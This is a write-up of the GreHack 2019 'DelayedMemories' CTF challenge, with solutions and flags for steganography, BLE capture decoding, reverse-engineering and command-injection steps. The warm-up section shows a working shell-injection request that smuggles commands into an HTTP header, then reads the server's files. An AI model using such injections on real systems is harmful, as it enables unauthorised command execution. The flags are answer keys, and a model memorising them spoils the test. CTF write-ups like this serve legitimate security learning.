DelayedMemories - GreHack challenge 2019
========================================

Introduction
------------

On Saturday 2019-09-21, https://twitter.com/GrehackConf/status/1175469861528584192 :

    The #DelayedMemories challenge is now online (right on time!): https://2019.challenge.grehack.fr/ ! Go pwn it and try to win your ticket for #GreHack19.


1. Real-world steganography / Aztec
-----------------------------------

Challenge:

    https://2019.challenge.grehack.fr/data/s0/Aztec_7bc0d88e744cdf8a24cd4f027831be9016372e405dc55188deb45ae64178e406.gif

Solution:

.. code-block:: sh

    ffmpeg -i Aztec_7bc0d88e744cdf8a24cd4f027831be9016372e405dc55188deb45ae64178e406.gif frame%06d.png

On frame 115: ``GH19{GoodOldMemories!}``


2. Warm-up
----------

Challenge:

    Small app, big hole. You know the drill: go break it.
    The challenge is accessible with this url.
    https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/
    https://2019.challenge.grehack.fr/data/s3/warm-up_b15608b099559d2cfd806b2755f3454fdbb6079b09519da6521ead488669e06e.zip

Command injection in ``IsItDown``::

    pingCommand := fmt.Sprintf("ping -c 1 -W 150 %s", address)
    command := exec.CommandContext(ctx, "sh", "-c", pingCommand)

Exploitation:

.. code-block:: sh

    $ curl -kv https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down -H 'Inspect-IP: 127.0.0.1;ps'

    < HTTP/1.1 200 OK
    < Content-Length: 475
    < Content-Security-Policy: default-src 'none'; font-src data:;
        img-src 'self'; style-src 'unsafe-inline'; frame-src https://www.openstreetmap.org;
    < Content-Type: application/json
    < Date: Sat, 21 Sep 2019 19:03:54 GMT
    < Referrer-Policy: no-referrer
    < X-Content-Type-Options: nosniff
    < X-Frame-Options: DENY
    < X-Xss-Protection: 1; mode=block
    < Connection: close
    <
    * Closing connection 0
    * TLSv1.2 (OUT), TLS alert, close notify (256):
    {"ip":"127.0.0.1;ps","down":false,"trace":
    "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.091 ms\n\n
    --- 127.0.0.1 ping statistics ---\n
    1 packets transmitted, 1 received, 0% packet loss, time 0ms\n
    rtt min/avg/max/mdev = 0.091/0.091/0.091/0.000 ms\n
    PID   USER     TIME  COMMAND\n
        1 nobody    0:01 /opt/echoip/echoip -d -f country.mmdb
            -c city.mmdb -a asn.mmdb -H Inspect-IP -H X-Forwarded-For\n
      280 nobody    0:00 ps\n"}

    $ pwd
    /opt/echoip

    $ ls -l
    total 81984
    -rw-r--r--    1 root     root       6552522 Sep  3 20:18 asn.mmdb
    -rw-r--r--    1 root     root      62850557 Sep  4 11:39 city.mmdb
    -rw-r--r--    1 root     root       3909254 Sep  4 11:34 country.mmdb
    -rwxr-xr-x    1 root     root      10582436 Sep  7 20:19 echoip
    -rw-r--r--    1 root     root         48422 Sep  7 20:18 index.html

    $ ls -l /
    /:
    total 60
    drwxr-xr-x    1 root     root          4096 Aug 26 12:45 bin
    drwxr-xr-x    5 root     root           340 Sep 21 17:36 dev
    drwxr-xr-x    1 root     root          4096 Sep 21 17:36 etc
    -rw-r--r--    1 root     root            51 Sep 20 23:23 flag
    drwxr-xr-x    2 root     root          4096 Aug 20 10:30 home
    drwxr-xr-x    1 root     root          4096 Aug 20 10:30 lib
    drwxr-xr-x    5 root     root          4096 Aug 20 10:30 media
    drwxr-xr-x    2 root     root          4096 Aug 20 10:30 mnt
    drwxr-xr-x    1 root     root          4096 Sep  7 20:19 opt
    dr-xr-xr-x  107 root     root             0 Sep 21 17:36 proc
    drwx------    2 root     root          4096 Aug 20 10:30 root
    drwxr-xr-x    2 root     root          4096 Aug 20 10:30 run
    drwxr-xr-x    2 root     root          4096 Aug 20 10:30 sbin
    drwxr-xr-x    2 root     root          4096 Aug 20 10:30 srv
    dr-xr-xr-x   13 root     root             0 Sep 21 17:36 sys
    drwxrwxrwt    2 root     root          4096 Aug 20 10:30 tmp
    drwxr-xr-x    1 root     root          4096 Aug 20 10:30 usr
    drwxr-xr-x    1 root     root          4096 Aug 20 10:30 var

    $ cat /flag
    GH19{challenges_for_the_ctf_will_not_be_that_easy}


3. Stacked
----------

Challenge:

    The flag doesn't follow any particular format.
    https://2019.challenge.grehack.fr/data/s1/stacked_ac5705f30623abd008a3d0eb1b026f3d58331d37065dfa07c7110c5f70fcf635

``file``::

    ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)

Functions::

    makecontext, swapcontext - manipulate user context
    void makecontext(ucontext_t *ucp, void (*func)(), int argc, ...);
    int swapcontext(ucontext_t *oucp, ucontext_t *ucp);

The program creates a ROP-chain an jump to it.

The ROP chain compares bytes of the input until it matches::

    Fr3ak1nR0P


4. BLE everywhere
-----------------

Challenge:

    You were drinking a well earned coffee when you saw at the neighbouring table a strange cup. Its owner changed the picture on the side of the mug with his phone. You happened to sniff Bluetooth traffic while he was doing so. Your goal is to retrieve the image printed on the cup's screen. Flag is case sensitive and doesn't contain any spaces.

    https://2019.challenge.grehack.fr/data/s2/flag_1e2462020c85b7906335363310d73d6db9e3d8c138e9ef4fd0f146a526331684.pcap

Documentation:

* https://ask.wireshark.org/question/584/problems-decoding-ble-capture-from-another-wireshark-program/
  => Is this captured using the Nordic BLE Sniffer?
  If so then you need to go to Preferences -> Protocols -> DLT_USER -> DLT Table and add a new entry for DLT User 10 (DLT=157) with Payload protocol ``nordic_ble``.

::

    1612	20.364504	Master_0xaf9a8a53	Slave_0xaf9a8a53	ATT	53	Sent Write Command, Handle: 0x000d (Unknown: Unknown)

Export to JSON and::

    jq -r '.[] | ._source.layers.btatt["btatt.value"]' < export.json | tr -d : | xxd -p -r > written_data.bin

Binary data, with many ``ff``.
Build image from binary, by guessing pixel encoding (black and white, 1 bit/pixel) and width (264 pixels).
Result::

    GH19{Bluetoothnotsosmart}


5. The GRID
-----------

Challenge:

    https://2019.challenge.grehack.fr/data/s4/thegrid_80f6b0f70565a2de15eab05c3ad603d18399bc2af1eabf870da6f2e4955b2a17

``file``: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b1136267760732a382a2c831b7dd30d8de3a6ac7, for GNU/Linux 3.2.0, stripped

grid at ``.data:0000000000004060`` ::

    flag = movements?
    grid : width=24
    => only spaces

    commands:
        0: x -= 2 (<<)
        1: y -= 2 (up-up)
        2: x += 1   (->)
        3: y += 1 (down)

    start = g_position__high_y__low_x = 0x2E00000015LL : x=21, y=46
    end : x=2, y=1

    OOOOAOO|||||OOOOOOOOOOO
    OO OOOO|||||OOOOO OOOOO   <- end at the beginning
    OO OAOA|||||OOOOO OOOOO
    O  OOOO|          !!OOO
    O OOOOO| |!!!!!!!!!!OOO
    O O//OA| |!!!!!!!!!!OOO
    O O//OO|        !!!!OOO
    O OOOOO|||!!!!! !!!!OOO
    O OOOOO|||||AAA AAOOOOO
    O     ||||||AAA AAOOOOO
    O---- ||||||AAA      OO
    OOO|  ||||||AAAAAAOO OO
    OOO| |||||||AAAAAAOO OO
    OOO| |OOA|AAAAAAAAOO OO
    OOO| |OOA|AAAAAAAAOO OO
    OOO| |OOO|||||||||OO OO
    OOO| |_____OO|||||OO OO
    OOO|       |O|||||OO OO
    OOO------| |O|||||OO OO
    OOXXXXXXO| |O|||||   OO
    OOO//XXXO|         OOOO
    OOO//XXXO| OO|||||OOOOO
    OOO!!XXXO| OO|||||OOOOO
    OOO!!XXXO  OO||//////OO
    OOO!!OOOO OOO||//////OO
    OO        OOO|||||||OOO
    OO !!OO OOOOO|||||O|OOO
    OO !!OO OOOOO|||||O|OOO
    OO !!OO OOOOOOOOOOO|OOO
    OO OOOO       OOOOO|OOO
    OO OOOOOOOOOO OOOOO|OOO
    OO O|||||OOOO   OOO|OOO
    OO O|||||OOOOOO OOO|OOO
    OO O|||||OOOOO  OOO|OOO
    OO O||||       OOOO|OOO
    OO O|||||OOOOO OOOO|OOO
    OO O|||||OOOOO OOOOOOOO
    OO O|||||OOOOO     OOOO
    OO  |||||OOOOOOOOO OOOO
    OOO |||||OOOOOOOOO OOOO
    OOO         OOOOOO OOOO
    OOOO|||||OOOOOOOOO OOOO
    OOOO|||||OOOOOOOOO OOOO
    OOOO|||||OOOOOOOO  OOOO
    O////////OOOOOOOO O   O
    O////////OOOOOOOO   O O
    O////////OOOOOOOOOOOO O  <- start
    OOOOOOOOOOOOOOOOOOOOOOO

Flag::

    LeAd@Ze@VAY

6. The puzzle
-------------

Challenge::

    Can you crack the puzzle? To validate, use GH19{...}, where ... is the valid input to solve the puzzle.
    https://2019.challenge.grehack.fr/data/s5/thepuzzle_df99b9e2e69d9608858f44e765774cf9f5e7afd19c0d40e5661b5f594198ab09.tgz

Files : ./script.enc and ./thepuzzle

* arg : path to .debugging_script file and key
* key : at least 4 chars, base64-encoded

* crypto : 16-bytes state, xor stream cipher

Grammar:

* file with begin...end => functions?
* ``$ + register`` => reg value (x86)
* ...

The parent debugs the child by executing a "program" given as a script file.

``.text:00000000000035B1`` is a function that decrypts functions by matching pattern ``48 89 e5 mov %rsp,%rbp`` and ``90 90 90 c3 nop;nop;nop;retq``

The list of functions can be obtained through: ``objdump --dwarf thepuzzle |grep FDE``

Child:

* Key schedule "This program cannot be run in DOS mode"

Try to decrypt ``script.enc`` by bruteforcing the key... it works!::

    i=1262
    KEY=b'\xee\x04\x00\x00'
    bytearray(b'begin MxWrPI3e73de96\nw 4070-106-3947+1539*3540-5424645 0-0*0-0+0-0+4\nwr 275155+497936+1369725 0+0+1+')

The program:

* Takes a screenshot (X11)
* Computes a SHA256
* XOR with 0x19
* compares the result with::

      .data:000000000020B220 g_final_flag_encrypted db 3Eh, 20h, 0Bh, 0DFh, 0A8h, 67h, 6Ah, 5Fh, 57h, 97h
      .data:000000000020B220                 db 78h, 11h, 0AEh, 9Ch, 28h, 3Bh, 5Bh, 0C4h, 0AAh, 9Dh
      .data:000000000020B220                 db 0E7h, 0FCh, 0DDh, 10h, 56h, 0C1h, 86h, 11h, 0A3h, 7Eh
      .data:000000000020B220                 db 9Fh, 3Ah

Reverse algo:

* final check = 3e200bdfa8676a5f57977811ae9c283b5bc4aa9de7fcdd1056c18611a37e9f3a
* xored with 0x19: 273912c6b17e73464e8e6108b785312242ddb384fee5c4094fd89f08ba678623
* bruteforce 8 letters: krH9kkGk
* Try ``GH19{krH9kkGk}`` => Try again :(
* Images encoded at the end of the ELF file::

      # is 0
      G is 1
      r is 2
      e is 3
      H is 4
      a is 5
      c is 6
      k is 7
      1 is 8
      9 is 9

Flag::

  GH19{72497717}

Final:

    CHAMPAGNE!

    Congratulations! You have solved the GreHack 2019 Challenge. We would have never guessed *YOU* would come to the end. You can see your final ranking on the scoreboard.
    Please send us an email at challenge@grehack.fr with your nickname and the flag of the last step, so that we can definitively validate your... validation. And do not hesitate to give us your feedback on Delayed Memories.
    Kudos again and we hope to see you at GreHack the 15/11/19.
